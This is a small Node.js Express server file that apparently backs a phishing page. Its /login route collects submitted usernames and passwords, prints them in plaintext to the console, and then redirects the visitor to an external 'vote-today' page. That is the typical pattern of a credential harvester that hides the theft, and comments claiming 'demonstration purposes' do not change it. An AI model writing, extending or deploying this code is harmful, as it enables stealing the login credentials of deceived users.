const express = require('express');
const bodyParser = require('body-parser');
const helmet = require('helmet'); // For additional security
const app = express();
const port = process.env.PORT || 3000; // Use environment variable or default to 3000

// Middleware
app.use(helmet()); // Enhance security
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public')); // Serve static files from the 'public' directory

// Serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Print credentials to console (for demonstration purposes)
    // Ensure this is removed or commented out in production
    console.log('Username:', username);
    console.log('Password:', password); // Note: Never log passwords in production

    // Redirect to the vote page
    res.redirect('https://vote-today.github.io/vote/');
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something went wrong!');
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

